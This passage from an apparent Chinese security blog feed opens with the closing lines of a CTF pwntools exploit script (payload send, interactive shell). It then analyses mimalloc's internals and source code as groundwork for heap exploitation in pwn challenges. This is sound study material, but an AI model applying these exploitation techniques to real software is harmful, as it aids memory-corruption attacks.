class="number">0</span>)+cyclic(<span class="number">0x3</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x4007C9&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MiMalloc</title>
      <link href="/2023/07/19/MiMalloc%E8%AF%A6%E8%A7%A3/"/>
      <url>/2023/07/19/MiMalloc%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在今年的HWS中遇到了一道堆 与往常不同的是 c语言标准库中的malloc分配器更换成了mimalloc 于是打算来了解一下这个分配器 查看一下这个分配器要如何利用</p><p>同时由于本人水平不足 对于mimalloc源码的分析不到位 很多地方也是一知半解 只能起到一个面向pwn解题的分析</p><p>个人认为相比起用ptmalloc锻炼源码分析能力 mimalloc更加轻量化 更能起到练手的一个效果</p><h2 id="编译环境配置"><a href="#编译环境配置" class="headerlink" title="编译环境配置"></a>编译环境配置</h2><p>本小节用来指引如何在ubuntu中配置c语言调用mimalloc库 如果没有需要自己编译题目来调试的 就不需要看</p><p><a href="https://github.com/microsoft/mimalloc">Microsoft &#x2F; Mimalloc：Mimalloc是一款紧凑的通用分配器，具有出色的性能。 (github.com)</a></p><p>首先git clone库到本地</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/microsoft/mimalloc.git</span><br></pre></td></tr></table></figure><p>随后创建一个目录用来存放构建后的项目</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmake ../mimalloc/</span><br><span class="line">make</span><br><span class="line">sudo make install </span><br></pre></td></tr></table></figure><p>接着是比较麻烦的一步 因为在执行完make install后 官方文档是说会在&#x2F;usr&#x2F;include中安装头文件 但是我实测是没有的 所以我们需要手动把头文件复制到对应目录中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cp -r /home/chen/mimalloc/include/* /usr/include/</span><br></pre></td></tr></table></figure><p>随后我们在使用gcc编译的时候 在后面加上-lmimalloc  就可以成功编译了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o test ./test.c -lmimalloc</span><br></pre></td></tr></table></figure><p>如果需要用到pwndbg进行源码调试的 需要编译.so文件的时候加上-DCMAKE_BUILD_TYPE&#x3D;Debug 参照官方文档</p><h2 id="结构分析"><a href="#结构分析" class="headerlink" title="结构分析"></a>结构分析</h2><p>对于每一个线程 都有对应的内存用来管理线程 我们称其为TLD</p><p>TLD主要由两个部分组成 segment和heap 我们先来介绍segment</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307202325016.png" title="image-20230720232504990" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307202325016.png" alt="image-20230720232504990"></a></p><p>这里的page就是实际分配给用户的内存 而第一个page的大小会小于其他page  是因为segment头部用来存放了当前segment的信息 占用了page的一部分空间</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307202326091.png" title="image-20230720232605058" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307202326091.png" alt="image-20230720232605058"></a></p><p>具体的成员我个人认为没有值得关注的 后面如果遇到了再说  这里先暂时记住segment的起始地址就是由于mi_malloc多分配的一块内存地址</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307272314016.png" title="image-20230727230229146" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307272314016.png" alt="image-20230727230229146"></a></p><p>heap重点的成员有三个 前面两个是用于存放空闲的内存块</p><p>pages_free_direct用于小于1024的内存块</p><p>thread_delayed_free是用于满页释放的 稍后会提及</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307210044239.png" title="image-20230721004423205" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307210044239.png" alt="image-20230721004423205"></a></p><p>通过pwndbg直接观察 会发现实际上重要信息存放是位于segment heap就起到了一个索引的功能</p><p>索引到的结构我们称之为内存页 其主要的成员就四个 </p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307210103575.png" title="image-20230721010343554" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307210103575.png" alt="image-20230721010343554"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307210048592.png" title="image-20230721004846559" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307210048592.png" alt="image-20230721004846559"></a></p><p>红框圈起来的就是free链表 蓝框圈起来的是local free链表</p><p>你会发现 和常规的malloc不同 并不是被申请过的内存块被释放后才会放入到链表中</p><p>当我们申请一个内存块后 当前page剩下的会划分成内存块放入到free链表中</p><p>当申请过的内存块释放后 会进入local free链表</p><p>随后我们来观察一下实际分配给用户的内存空间</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307210109604.png" title="image-20230721010905578" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202307210109604.png" alt="image-20230721010905578"></a></p><p>此时我申请的是0x80大小的内存空间 可以看到此时的free链表就已经成型了</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="mi-malloc"><a href="#mi-malloc" class="headerlink" title="mi_malloc"></a>mi_malloc</h3><p>我们来分析一下mi_malloc函数的源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">inline</span> <span class="type">void</span>* _mi_heap_malloc_zero(<span class="type">mi_heap_t</span>* heap, <span class="type">size_t</span> size, <span class="type">bool</span> zero) mi_attr_noexcept &#123;</span><br><span class="line">  <span class="keyword">return</span> _mi_heap_malloc_zero_ex(heap, size, zero, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mi_decl_nodiscard <span class="keyword">extern</span> <span class="keyword">inline</span> mi_decl_restrict <span class="type">void</span>* <span class="title function_">mi_heap_malloc</span><span class="params">(<span class="type">mi_heap_t</span>* heap, <span class="type">size_t</span> size)</span> mi_attr_noexcept &#123;</span><br><span class="line">  <span class="keyword">return</span> _mi_heap_malloc_zero(heap, size, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mi_decl_nodiscard <span class="keyword">extern</span> <span class="keyword">inline</span> mi_decl_restrict <span class="type">void</span>* <span class="title function_">mi_malloc</span><span class="params">(<span class="type">size_t</span> size)</span> mi_attr_noexcept &#123;</span><br><span class="line">  <span class="keyword">return</span> mi_heap_malloc(mi_prim_get_default_heap(), size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mimalloc通过多次跳转指向了_mi_heap_malloc_zero_ex函数 我们来分析一下这个函数的源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// The main allocation function</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">inline</span> <span class="type">void</span>* _mi_heap_malloc_zero_ex(<span class="type">mi_heap_t</span>* heap, <span class="type">size_t</span> size, <span class="type">bool</span> zero, <span class="type">size_t</span> huge_alignment) mi_attr_noexcept &#123;</span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_likely</span><span class="params">(size &lt;= MI_SMALL_SIZE_MAX)</span> &#123;</span><br><span class="line">    mi_assert_internal(huge_alignment == <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> mi_heap_malloc_small_zero(heap, size, zero);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    mi_assert(heap!=<span class="literal">NULL</span>);</span><br><span class="line">    mi_assert(heap-&gt;thread_id == <span class="number">0</span> || heap-&gt;thread_id == _mi_thread_id());   <span class="comment">// heaps are thread local</span></span><br><span class="line">    <span class="type">void</span>* <span class="type">const</span> p = _mi_malloc_generic(heap, size + MI_PADDING_SIZE, zero, huge_alignment);  <span class="comment">// note: size can overflow but it is detected in malloc_generic</span></span><br><span class="line">    mi_track_malloc(p,size,zero);</span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> MI_STAT&gt;1</span></span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!mi_heap_is_initialized(heap)) &#123; heap = mi_prim_get_default_heap(); &#125;</span><br><span class="line">      mi_heap_stat_increase(heap, <span class="built_in">malloc</span>, mi_usable_size(p));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> MI_DEBUG&gt;3</span></span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; zero) &#123;</span><br><span class="line">      mi_assert_expensive(mi_mem_is_zero(p, size));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是对要申请chunk的大小进行了一个判断 如果小于MI_SMALL_SIZE_MAX 就会跳转到samll chunk的申请 同时进行了一个断言检测</p><p>MI_SMALL_SIZE_MAX的值定义在mimalloc.h中 可以看到是1024(64位的情况下 和指针字节大小有关系)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MI_SMALL_WSIZE_MAX (128)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MI_SMALL_SIZE_MAX (MI_SMALL_WSIZE_MAXsizeof(void))</span></span><br></pre></td></tr></table></figure><p>我们先来分析大于1024的内存分配逻辑</p><p>对于heap指针是否为空和线程id进行了检查</p><p>随后跳转到_mi_malloc_generic函数中进行内存分配  mi_track_malloc函数是用来将内存块的信息存储在track跟踪器中 方便调试</p><p>接着使用了条件编译语句  根据MI_STAT的值来决定是否记录更新heap的数据 用于调试</p><p>mi_heap_stat_increase函数用于更新heap的统计数据 mi_usable_size函数用于计算内存块的实际大小(不是申请的大小)</p><p>如果MI_DEBUG的值设置为3 那么就会调用mi_assert_expensive函数检测条件是否成立 这里的条件是调用mi_mem_is_zero来检测分配的内存块的前size个字节是否为0 MI_DEBUG的默认值为0 常规情况下我们并不用担心fake_chunk被检测出来</p><h3 id="mi-malloc-generic"><a href="#mi-malloc-generic" class="headerlink" title="_mi_malloc_generic"></a>_mi_malloc_generic</h3><p>随后我们进入_mi_malloc_generic函数 查看一下分析的主要逻辑</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span>* _mi_malloc_generic(<span class="type">mi_heap_t</span>* heap, <span class="type">size_t</span> size, <span class="type">bool</span> zero, <span class="type">size_t</span> huge_alignment) mi_attr_noexcept</span><br><span class="line">&#123;</span><br><span class="line">  mi_assert_internal(heap != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// initialize if necessary</span></span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(!mi_heap_is_initialized(heap))</span> &#123;</span><br><span class="line">    heap = mi_heap_get_default(); <span class="comment">// calls mi_thread_init </span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(!mi_heap_is_initialized(heap))</span> &#123; <span class="keyword">return</span> <span class="literal">NULL</span>; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  mi_assert_internal(mi_heap_is_initialized(heap));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// call potential deferred free routines</span></span><br><span class="line">  _mi_deferred_free(heap, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// free delayed frees from other threads (but skip contended ones)</span></span><br><span class="line">  _mi_heap_delayed_free_partial(heap);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// find (or allocate) a page of the right size</span></span><br><span class="line">  <span class="type">mi_page_t</span>* page = mi_find_page(heap, size, huge_alignment);</span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(page == <span class="literal">NULL</span>)</span> &#123; <span class="comment">// first time out of memory, try to collect and retry the allocation once more</span></span><br><span class="line">    mi_heap_collect(heap, <span class="literal">true</span> <span class="comment">/* force */</span>);</span><br><span class="line">    page = mi_find_page(heap, size, huge_alignment);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(page == <span class="literal">NULL</span>)</span> &#123; <span class="comment">// out of memory</span></span><br><span class="line">    <span class="type">const</span> <span class="type">size_t</span> req_size = size - MI_PADDING_SIZE;  <span class="comment">// correct for padding_size in case of an overflow on `size`</span></span><br><span class="line">    _mi_error_message(ENOMEM, <span class="string">&quot;unable to allocate memory (%zu bytes)\n&quot;</span>, req_size);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  mi_assert_internal(mi_page_immediate_available(page));</span><br><span class="line">  mi_assert_internal(mi_page_block_size(page) &gt;= size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// and try again, this time succeeding! (i.e. this should never recurse through _mi_page_malloc)</span></span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(zero &amp;&amp; page-&gt;xblock_size == <span class="number">0</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// note: we cannot call _mi_page_malloc with zeroing for huge blocks; we zero it afterwards in that case.</span></span><br><span class="line">    <span class="type">void</span>* p = _mi_page_malloc(heap, page, size, <span class="literal">false</span>);</span><br><span class="line">    mi_assert_internal(p != <span class="literal">NULL</span>);</span><br><span class="line">    _mi_memzero_aligned(p, mi_page_usable_block_size(page));</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> _mi_page_malloc(heap, page, size, zero);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最开始对于heap是否初始化了进行一个检测 如果没有初始化则进行初始化</p><p>随后调用_mi_deferred_free将本线程所有标记释放的内存块加入到延迟释放列表中 随后批量释放 这一操作是为了提高性能</p><p>调用_mi_heap_delayed_free_partial函数 释放其他线程已经标记释放的内存块 但跳过正在争用的内存块</p><p>接着调用mi_find_page函数寻找可用的page 如果没有找到则将空闲的内存块回收后再次查找</p><p>如果最后还是没有找到空闲的page 就说明空间不足 触发断言输出报错</p><p>如果找到了可用的page 接着对于page的立即可用性进行检测 以及检测page的大小是否满足size的需求 这里的检测依赖的是page的xblock成员 其存储的是当前page中的内存块大小</p><p>接着是性能优化的问题 通过xblock和zero参数来决定用哪种办法来清零内存块的内容</p><h3 id="mi-page-malloc"><a href="#mi-page-malloc" class="headerlink" title="_mi_page_malloc"></a>_mi_page_malloc</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">inline</span> <span class="type">void</span>* _mi_page_malloc(<span class="type">mi_heap_t</span>* heap, <span class="type">mi_page_t</span>* page, <span class="type">size_t</span> size, <span class="type">bool</span> zero) mi_attr_noexcept &#123;</span><br><span class="line">  mi_assert_internal(page-&gt;xblock_size==<span class="number">0</span>||mi_page_block_size(page) &gt;= size);</span><br><span class="line">  <span class="type">mi_block_t</span>* <span class="type">const</span> block = page-&gt;<span class="built_in">free</span>;</span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(block == <span class="literal">NULL</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> _mi_malloc_generic(heap, size, zero, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  mi_assert_internal(block != <span class="literal">NULL</span> &amp;&amp; _mi_ptr_page(block) == page);</span><br><span class="line">  <span class="comment">// pop from the free list</span></span><br><span class="line">  page-&gt;used++;</span><br><span class="line">  page-&gt;<span class="built_in">free</span> = mi_block_next(page, block);</span><br><span class="line">  mi_assert_internal(page-&gt;<span class="built_in">free</span> == <span class="literal">NULL</span> || _mi_ptr_page(page-&gt;<span class="built_in">free</span>) == page);</span><br><span class="line">  <span class="meta">#<span class="keyword">if</span> MI_DEBUG&gt;3</span></span><br><span class="line">  <span class="keyword">if</span> (page-&gt;free_is_zero) &#123;</span><br><span class="line">    mi_assert_expensive(mi_mem_is_zero(block+<span class="number">1</span>,size - <span class="keyword">sizeof</span>(*block)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// allow use of the block internally</span></span><br><span class="line">  <span class="comment">// note: when tracking we need to avoid ever touching the MI_PADDING since</span></span><br><span class="line">  <span class="comment">// that is tracked by valgrind etc. as non-accessible (through the red-zone, see `mimalloc/track.h`)</span></span><br><span class="line">  mi_track_mem_undefined(block, mi_page_usable_block_size(page));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// zero the block? note: we need to zero the full block size (issue #63)</span></span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(zero)</span> &#123;</span><br><span class="line">    mi_assert_internal(page-&gt;xblock_size != <span class="number">0</span>); <span class="comment">// do not call with zero&#x27;ing for huge blocks (see _mi_malloc_generic)</span></span><br><span class="line">    mi_assert_internal(page-&gt;xblock_size &gt;= MI_PADDING_SIZE);</span><br><span class="line">    <span class="keyword">if</span> (page-&gt;free_is_zero) &#123;</span><br><span class="line">      block-&gt;next = <span class="number">0</span>;</span><br><span class="line">      mi_track_mem_defined(block, page-&gt;xblock_size - MI_PADDING_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      _mi_memzero_aligned(block, page-&gt;xblock_size - MI_PADDING_SIZE);</span><br><span class="line">    &#125;    </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> (MI_DEBUG&gt;0) &amp;&amp; !MI_TRACK_ENABLED &amp;&amp; !MI_TSAN</span></span><br><span class="line">  <span class="keyword">if</span> (!zero &amp;&amp; !mi_page_is_huge(page)) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(block, MI_DEBUG_UNINIT, mi_page_usable_block_size(page));</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> (MI_SECURE!=0)</span></span><br><span class="line">  <span class="keyword">if</span> (!zero) &#123; block-&gt;next = <span class="number">0</span>; &#125; <span class="comment">// don&#x27;t leak internal data</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> (MI_STAT&gt;0)</span></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bsize = mi_page_usable_block_size(page);</span><br><span class="line">  <span class="keyword">if</span> (bsize &lt;= MI_MEDIUM_OBJ_SIZE_MAX) &#123;</span><br><span class="line">    mi_heap_stat_increase(heap, normal, bsize);</span><br><span class="line">    mi_heap_stat_counter_increase(heap, normal_count, <span class="number">1</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> (MI_STAT&gt;1)</span></span><br><span class="line">    <span class="type">const</span> <span class="type">size_t</span> bin = _mi_bin(bsize);</span><br><span class="line">    mi_heap_stat_increase(heap, normal_bins[bin], <span class="number">1</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MI_PADDING <span class="comment">// &amp;&amp; !MI_TRACK_ENABLED</span></span></span><br><span class="line">  <span class="type">mi_padding_t</span>* <span class="type">const</span> padding = (<span class="type">mi_padding_t</span>*)((<span class="type">uint8_t</span>*)block + mi_page_usable_block_size(page));</span><br><span class="line">  <span class="type">ptrdiff_t</span> delta = ((<span class="type">uint8_t</span>*)padding - (<span class="type">uint8_t</span>*)block - (size - MI_PADDING_SIZE));</span><br><span class="line">  <span class="meta">#<span class="keyword">if</span> (MI_DEBUG&gt;=2)</span></span><br><span class="line">  mi_assert_internal(delta &gt;= <span class="number">0</span> &amp;&amp; mi_page_usable_block_size(page) &gt;= (size - MI_PADDING_SIZE + delta));</span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  mi_track_mem_defined(padding,<span class="keyword">sizeof</span>(<span class="type">mi_padding_t</span>));  <span class="comment">// note: re-enable since mi_page_usable_block_size may set noaccess</span></span><br><span class="line">  padding-&gt;canary = (<span class="type">uint32_t</span>)(mi_ptr_encode(page,block,page-&gt;keys));</span><br><span class="line">  padding-&gt;delta  = (<span class="type">uint32_t</span>)(delta);</span><br><span class="line">  <span class="meta">#<span class="keyword">if</span> MI_PADDING_CHECK</span></span><br><span class="line">  <span class="keyword">if</span> (!mi_page_is_huge(page)) &#123;</span><br><span class="line">    <span class="type">uint8_t</span>* fill = (<span class="type">uint8_t</span>*)padding - delta;</span><br><span class="line">    <span class="type">const</span> <span class="type">size_t</span> maxpad = (delta &gt; MI_MAX_ALIGN_SIZE ? MI_MAX_ALIGN_SIZE : delta); <span class="comment">// set at most N initial padding bytes</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; maxpad; i++) &#123; fill[i] = MI_DEBUG_PADDING; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开头对于xblock和page的free链表重新进行了检查</p><p>如果block为零 则说明不存在对应大小的page页 就调用_mi_malloc_generic函数来分配</p><p>接着自增了page的used成员 同时更新free链表 调用 mi_block_next函数来获取下一个内存块的地址 并且进行了检测 不能为0</p><p>随后根据zero来决定是否在内存块中填充数据 方便用来检测内存越界等问题 常规情况下都是\x00 但是如果开启了调试模式 就会被填充成\xd0</p><p>下面的一大堆编译优化的都不影响我们内存分配 所以这里忽略 感兴趣的可以自行了解</p><h3 id="mi-find-page"><a href="#mi-find-page" class="headerlink" title="mi_find_page"></a>mi_find_page</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Allocate a page</span></span><br><span class="line"><span class="comment">// Note: in debug mode the size includes MI_PADDING_SIZE and might have overflowed.</span></span><br><span class="line"><span class="type">static</span> <span class="type">mi_page_t</span>* <span class="title function_">mi_find_page</span><span class="params">(<span class="type">mi_heap_t</span>* heap, <span class="type">size_t</span> size, <span class="type">size_t</span> huge_alignment)</span> mi_attr_noexcept &#123;</span><br><span class="line">  <span class="comment">// huge allocation?</span></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> req_size = size - MI_PADDING_SIZE;  <span class="comment">// correct for padding_size in case of an overflow on `size`  </span></span><br><span class="line">  <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(req_size &gt; (MI_MEDIUM_OBJ_SIZE_MAX - MI_PADDING_SIZE) || huge_alignment &gt; <span class="number">0</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">mi_unlikely</span><span class="params">(req_size &gt; PTRDIFF_MAX)</span> &#123;  <span class="comment">// we don&#x27;t allocate more than PTRDIFF_MAX (see &lt;https://sourceware.org/ml/libc-announce/2019/msg00001.html&gt;)</span></span><br><span class="line">      _mi_error_message(EOVERFLOW, <span class="string">&quot;allocation request is too large (%zu bytes)\n&quot;</span>, req_size);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> mi_large_huge_page_alloc(heap,size,huge_alignment);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// otherwise find a page with free blocks in our size segregated queues</span></span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> MI_PADDING</span></span><br><span class="line">    mi_assert_internal(size &gt;= MI_PADDING_SIZE); </span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> mi_find_free_page(heap, size);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们留意一下开头的这句话</p><p><strong>&#x2F;&#x2F; Note: in debug mode the size includes MI_PADDING_SIZE and might have overflowed.</strong></p><p>这就是当我们在调试模式下  申请一个0x200的内存块 实际分配到的是0x280的原因 MI_PADDING_SIZE在上一个小节中出现过 其用来计算填充数据的字节 检测是否存在内存溢出等</p><p>默认情况下MI_PADDING_SIZE是零</p><p>至于第一个if判断也用上了unlikely 因为几乎不会触发 看一下MI_MEDIUM_OBJ_SIZE_MAX的值就知道了 64位的情况下MI_MEDIUM_PAGE_SIZE是128kib 也就是说MI_MEDIUM_OBJ_SIZE_MAX是32*1024字节 一般来说size是肯定小于的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define MI_MEDIUM_OBJ_SIZE_MAX (MI_MEDIUM_PAGE_SIZE/4) // 128KiB on 64-bit</span><br></pre></td></tr></table></figure><p>接着就是调用mi_find_free_page来查找空闲的page</p><h3 id="mi-find-free-page"><a href="#mi-find-free-page" class="headerlink" title="mi_find_free_page"></a>mi_find_free_page</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Find a page with free blocks of `size`.</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">mi_page_t</span>* <span class="title function_">mi_find_free_page</span><span class="params">(<span class="type">mi_heap_t</span>* heap, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">  <span class="type">mi_page_queue_t</span>* pq = mi_page_queue(heap,size);</span><br><span class="line">  <span class="type">mi_page_t</span>* page = pq-&gt;first;</span><br><span class="line">  <span class="keyword">if</span> (page != <span class="literal">NULL</span>) &#123;</span><br><span class="line">   <span class="meta">#<span class="keyword">if</span> (MI_SECURE&gt;=3) <span class="comment">// in secure mode, we extend half the time to increase randomness</span></span></span><br><span class="line">    <span class="keyword">if</span> (page-&gt;capacity &lt; page-&gt;reserved &amp;&amp; ((_mi_heap_random_next(heap) &amp; <span class="number">1</span>) == <span class="number">1</span>)) &#123;</span><br><span class="line">      mi_page_extend_free(heap, page, heap-&gt;tld);</span><br><span class="line">      mi_assert_internal(mi_page_immediate_available(page));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">   <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#123;</span><br><span class="line">      _mi_page_free_collect(page,<span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mi_page_immediate_available(page)) &#123;</span><br><span class="line">      page-&gt;retire_expire = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> page; <span class="comment">// fast path</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> mi_page_queue_find_free_ex(heap, pq, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过mi_page_queue函数索引到对应大小的队列 如果是首次申请该size 一般来说都是page都是0</p><p>申请过的话 会索引到page1的内存页</p><p>接下来是debug模式才会触发的随机扩展 目的是为了增加安全性 这里不进行讨论</p><p>接着调用_mi_page_free_collect函数获取page</p><p>调用mi_page_immediate_available检测page是否可用 如果可用则置零retire_expire 将page标识为不回收 随后返回</p><p>如果page为零 那么就调用mi_page_queue_find_free_ex进行下一步的查找</p><h3 id="mi-page-queue-find-free-ex"><a href="#mi-page-queue-find-free-ex" class="headerlink" title="mi_page_queue_find_free_ex"></a>mi_page_queue_find_free_ex</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">mi_page_t</span>* <span class="title function_">mi_page_queue_find_free_ex</span><span class="params">(<span class="type">mi_heap_t</span>* heap, <span class="type">mi_page_queue_t</span>* pq, <span class="type">bool</span> first_try)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// search through the pages in &quot;next fit&quot; order</span></span><br><span class="line">  <span class="meta">#<span class="keyword">if</span> MI_STAT</span></span><br><span class="line">  <span class="type">size_t</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">mi_page_t</span>* page = pq-&gt;first;</span><br><span class="line">  <span class="keyword">while</span> (page != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">mi_page_t</span>* next = page-&gt;next; <span class="comment">// remember next</span></span><br><span class="line">    <span class="meta">#<span class="keyword">if</span> 